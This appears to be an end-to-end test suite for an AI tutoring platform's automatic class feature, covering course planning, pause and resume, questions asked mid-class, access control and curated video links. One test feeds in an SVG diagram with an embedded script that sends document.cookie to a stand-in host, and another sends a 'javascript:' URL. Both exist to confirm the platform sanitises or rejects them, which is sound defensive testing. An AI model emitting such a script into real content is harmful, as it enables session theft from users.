import { Test, type TestingModule } from "@nestjs/testing";
import type { INestApplication } from "@nestjs/common";
import request from "supertest";
import { Client as PgClient } from "pg";
import { AppModule } from "../src/app.module";
import { configureApp } from "../src/bootstrap";
import { ControlPrismaService } from "../src/control-db/control-prisma.service";
import { AiService } from "../src/ai/ai.service";

const FIXTURE_PREFIX = "e2e-class-";

const COURSE = {
  lessons: [
    { title: "What a fraction is", objectives: ["Name the parts"] },
    { title: "Equivalent fractions", objectives: ["Spot equivalents"] },
    { title: "Adding fractions", objectives: ["Find a common denominator"] },
  ],
};

const SAFE_DIAGRAM = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 20"><rect x="0" y="0" width="50" height="20" fill="#4f46e5"/></svg>`;

describe("AI Teacher automatic class (e2e)", () => {
  let app: INestApplication;
  let controlPrisma: ControlPrismaService;
  let generateText: jest.Mock;
  let generateJson: jest.Mock;

  let adminToken: string;
  let studentToken: string;
  let subjectId: string;

  const platformEmail = `${FIXTURE_PREFIX}platform-${Date.now()}@wisdomcampus.example`;
  const password = "Sup3rSecret!Pass";
  const school = { slug: `${FIXTURE_PREFIX}${Date.now()}`, adminEmail: `${FIXTURE_PREFIX}admin@example.com` };
  const studentEmail = `${FIXTURE_PREFIX}student@example.com`;

  const asAdmin = () => ({ Authorization: `Bearer ${adminToken}` });
  const asStudent = () => ({ Authorization: `Bearer ${studentToken}` });

  async function purgeFixtures() {
    const schools = await controlPrisma.school.findMany({ where: { slug: { startsWith: FIXTURE_PREFIX } } });
    for (const s of schools) {
      const admin = new PgClient({ connectionString: process.env.POSTGRES_ADMIN_URL });
      await admin.connect();
      await admin.query(`DROP DATABASE IF EXISTS "${s.databaseName}" WITH (FORCE)`).catch(() => undefined);
      await admin.end();
    }
    await controlPrisma.provisioningAttempt.deleteMany({ where: { school: { slug: { startsWith: FIXTURE_PREFIX } } } });
    await controlPrisma.school.deleteMany({ where: { slug: { startsWith: FIXTURE_PREFIX } } });
    await controlPrisma.platformUser.deleteMany({ where: { email: { startsWith: FIXTURE_PREFIX } } });
  }

  const login = async (email: string) => {
    const res = await request(app.getHttpServer())
      .post("/v1/auth/login")
      .send({ schoolSlug: school.slug, email, password })
      .expect(200);
    return res.body.accessToken as string;
  };

  const startClass = async (topic = "Fractions") => {
    const res = await request(app.getHttpServer())
      .post("/v1/ai-teacher/sessions")
      .set(asStudent())
      .send({ subjectId, topic, mode: "AUTO" })
      .expect(201);
    return res.body.id as string;
  };

  beforeAll(async () => {
    generateText = jest.fn().mockResolvedValue("Here is the lesson.");
    generateJson = jest.fn().mockResolvedValue(COURSE);

    const moduleRef: TestingModule = await Test.createTestingModule({ imports: [AppModule] })
      .overrideProvider(AiService)
      .useValue({ generateText, generateJson })
      .compile();

    app = moduleRef.createNestApplication();
    configureApp(app);
    await app.init();
    await new Promise<void>((resolve) => app.getHttpServer().listen(0, resolve));

    controlPrisma = app.get(ControlPrismaService);
    await purgeFixtures();

    const argon2 = await import("argon2");
    await controlPrisma.platformUser.create({
      data: {
        email: platformEmail,
        passwordHash: await argon2.hash(password),
        firstName: "E2E",
        lastName: "Platform",
        roles: ["PLATFORM_ADMIN"],
      },
    });
    const platformLogin = await request(app.getHttpServer())
      .post("/v1/platform/auth/login")
      .send({ email: platformEmail, password })
      .expect(200);

    await request(app.getHttpServer())
      .post("/v1/platform/schools")
      .set("Authorization", `Bearer ${platformLogin.body.accessToken}`)
      .send({
        name: school.slug,
        slug: school.slug,
        adminEmail: school.adminEmail,
        adminPassword: password,
        adminFirstName: "Admin",
        adminLastName: school.slug,
      })
      .expect(201);

    adminToken = await login(school.adminEmail);

    const subject = await request(app.getHttpServer())
      .post("/v1/subjects")
      .set(asAdmin())
      .send({ name: "Mathematics", gradeLevel: "Grade 5" })
      .expect(201);
    subjectId = subject.body.id;

    await request(app.getHttpServer())
      .post("/v1/students")
      .set(asAdmin())
      .send({ firstName: "Ada", lastName: "One", email: studentEmail, password })
      .expect(201);
    studentToken = await login(studentEmail);
    // Same reasoning as the other tutor suites: provisioning plus argon2
    // logins do not fit Jest's default hook timeout under a full run.
  }, 180000);

  afterAll(async () => {
    if (controlPrisma) await purgeFixtures().catch(() => undefined);
    if (app) await app.close();
  }, 120000);

  beforeEach(() => {
    generateText.mockClear();
    generateJson.mockClear();
    generateText.mockResolvedValue("Here is the lesson.");
    generateJson.mockResolvedValue(COURSE);
  });

  it("plans a course when the class starts", async () => {
    const res = await request(app.getHttpServer())
      .post("/v1/ai-teacher/sessions")
      .set(asStudent())
      .send({ subjectId, topic: "Fractions", mode: "AUTO" })
      .expect(201);

    expect(res.body.mode).toBe("AUTO");
    expect(res.body.position).toBe(0);
    expect(res.body.outline.lessons).toHaveLength(3);
    expect(generateJson).toHaveBeenCalledTimes(1);
  });

  it("refuses to open a class it could not plan, rather than one with nothing to teach", async () => {
    generateJson.mockResolvedValueOnce({ lessons: [] });
    await request(app.getHttpServer())
      .post("/v1/ai-teacher/sessions")
      .set(asStudent())
      .send({ subjectId, topic: "Nonsense", mode: "AUTO" })
      .expect(400);
  });

  it("teaches lesson one, then lesson two, in order", async () => {
    const id = await startClass();

    const first = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);
    expect(first.body.position).toBe(1);
    expect(first.body.finished).toBe(false);
    expect(first.body.lesson.title).toBe("What a fraction is");
    expect(first.body.percent).toBe(33);

    const second = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);
    expect(second.body.position).toBe(2);
    expect(second.body.lesson.title).toBe("Equivalent fractions");

    // The second lesson's prompt must know the first one happened, or the
    // course restarts every time.
    const prompt = generateText.mock.calls[1][0] as string;
    expect(prompt).toContain("lesson 2 of 3");
    expect(prompt).toContain("The class so far");
  });

  it("resumes at the lesson it was paused on, not at the beginning", async () => {
    const id = await startClass("Long division");

    await request(app.getHttpServer()).post(`/v1/ai-teacher/sessions/${id}/continue`).set(asStudent()).expect(201);

    const paused = await request(app.getHttpServer())
      .patch(`/v1/ai-teacher/sessions/${id}/pause`)
      .set(asStudent())
      .expect(200);
    expect(paused.body.status).toBe("PAUSED");
    expect(paused.body.position).toBe(1);

    // Coming back — possibly days later — must land on lesson 2.
    const reopened = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);
    expect(reopened.body.position).toBe(1);
    expect(reopened.body.currentLesson.title).toBe("Equivalent fractions");
    expect(reopened.body.percent).toBe(33);

    const resumed = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);
    expect(resumed.body.lesson.title).toBe("Equivalent fractions");
    expect(resumed.body.position).toBe(2);
    // Continuing a paused class puts it back in progress without ceremony.
    const after = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);
    expect(after.body.status).toBe("ACTIVE");
  });

  it("keeps the same course across a pause instead of inventing a new one", async () => {
    const id = await startClass("Stable course");
    await request(app.getHttpServer()).patch(`/v1/ai-teacher/sessions/${id}/pause`).set(asStudent()).expect(200);

    generateJson.mockResolvedValue({ lessons: [{ title: "A completely different course", objectives: [] }] });
    const reopened = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);

    expect(reopened.body.course.lessons).toHaveLength(3);
    expect(reopened.body.currentLesson.title).toBe("What a fraction is");
  });

  it("answers a question mid-class without costing the student a lesson", async () => {
    const id = await startClass("Interruptions");
    await request(app.getHttpServer()).post(`/v1/ai-teacher/sessions/${id}/continue`).set(asStudent()).expect(201);

    const asked = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/ask`)
      .set(asStudent())
      .send({ question: "Wait, what is a numerator?" })
      .expect(201);

    // Position is untouched: interrupting must not skip teaching.
    expect(asked.body.position).toBe(1);
    const after = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);
    expect(after.body.position).toBe(1);
    expect(after.body.currentLesson.title).toBe("Equivalent fractions");
    // A question is not part of the course, and the transcript says so.
    const question = after.body.turns.find((t: { content: string }) => t.content.includes("numerator"));
    expect(question.lessonIndex).toBeNull();
  });

  it("reports the class finished after the last lesson and teaches no more", async () => {
    const id = await startClass("Short course");
    for (let i = 0; i < 3; i += 1) {
      await request(app.getHttpServer()).post(`/v1/ai-teacher/sessions/${id}/continue`).set(asStudent()).expect(201);
    }

    const finished = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);
    expect(finished.body.finished).toBe(true);
    expect(finished.body.percent).toBe(100);

    generateText.mockClear();
    const past = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);
    expect(past.body.finished).toBe(true);
    expect(past.body.turn).toBeNull();
    // Nothing left to teach means nothing left to pay for.
    expect(generateText).not.toHaveBeenCalled();
  });

  it("stores a safe diagram alongside the lesson", async () => {
    generateText.mockResolvedValue(`Half of the bar is shaded.\n${SAFE_DIAGRAM}`);
    const id = await startClass("Diagrams");

    const taught = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);

    expect(taught.body.turn.content).toBe("Half of the bar is shaded.");
    expect(taught.body.turn.diagram).toBe(SAFE_DIAGRAM);
  });

  it("throws away a hostile diagram but still teaches the lesson", async () => {
    generateText.mockResolvedValue(
      `Here you go.\n<svg viewBox="0 0 1 1"><script>fetch('https://evil.test?c='+document.cookie)</script></svg>`,
    );
    const id = await startClass("Hostile diagram");

    const taught = await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${id}/continue`)
      .set(asStudent())
      .expect(201);

    expect(taught.body.turn.diagram).toBeNull();
    expect(taught.body.turn.content).toContain("Here you go.");

    // And nothing script-shaped reached the database.
    const stored = await request(app.getHttpServer())
      .get(`/v1/ai-teacher/sessions/${id}`)
      .set(asStudent())
      .expect(200);
    expect(JSON.stringify(stored.body)).not.toContain("<script");
    expect(JSON.stringify(stored.body)).not.toContain("evil.test");
  });

  it("refuses to continue a question-and-answer session as if it were a class", async () => {
    const ask = await request(app.getHttpServer())
      .post("/v1/ai-teacher/sessions")
      .set(asStudent())
      .send({ subjectId, topic: "Just asking" })
      .expect(201);

    await request(app.getHttpServer())
      .post(`/v1/ai-teacher/sessions/${ask.body.id}/continue`)
      .set(asStudent())
      .expect(400);
  });

  it("never lets one student continue, pause or resume another's class", async () => {
    const id = await startClass("Private");
    generateText.mockClear();

    await request(app.getHttpServer()).post(`/v1/ai-teacher/sessions/${id}/continue`).set(asAdmin()).expect(404);
    await request(app.getHttpServer()).patch(`/v1/ai-teacher/sessions/${id}/pause`).set(asAdmin()).expect(404);
    await request(app.getHttpServer()).patch(`/v1/ai-teacher/sessions/${id}/resume`).set(asAdmin()).expect(404);
    expect(generateText).not.toHaveBeenCalled();
  });

  describe("demonstrations the school curates", () => {
    it("refuses a link that is not a normal web address", async () => {
      await request(app.getHttpServer())
        .post("/v1/ai-teacher/resources")
        .set(asAdmin())
        .send({ subjectId, title: "Bad", url: "javascript:alert(1)" })
        .expect(400);
    });

    it("refuses a student adding one", async () => {
      await request(app.getHttpServer())
        .post("/v1/ai-teacher/resources")
        .set(asStudent())
        .send({ subjectId, title: "Mine", url: "https://example.com/x" })
        .expect(403);
    });

    it("offers a matching demonstration for the lesson about to be taught", async () => {
      await request(app.getHttpServer())
        .post("/v1/ai-teacher/resources")
        .set(asAdmin())
        .send({
          subjectId,
          title: "What a fraction is — demonstration",
          url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
          keywords: "fraction parts",
        })
        .expect(201);

      const id = await startClass("Fractions with a demo");
      const opened = await request(app.getHttpServer())
        .get(`/v1/ai-teacher/sessions/${id}`)
        .set(asStudent())
        .expect(200);

      expect(opened.body.resources).toHaveLength(1);
      expect(opened.body.resources[0].embedUrl).toBe("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ");
    });
  });
});
